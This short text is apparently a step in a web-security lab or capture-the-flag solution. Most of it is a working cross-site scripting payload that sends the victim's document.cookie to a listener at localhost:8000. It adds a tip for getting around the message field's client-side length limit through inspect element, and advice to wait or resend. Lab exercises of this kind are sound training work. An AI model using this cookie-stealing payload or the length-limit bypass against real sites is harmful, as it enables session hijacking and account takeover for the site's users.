<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://localhost:8000", true); xhr.send(document.cookie);</script>

This is the same request as before. The key here is to inspect element and change the number of characters accepted for the message field. (max something)

You might need to wait a bit or send another request.
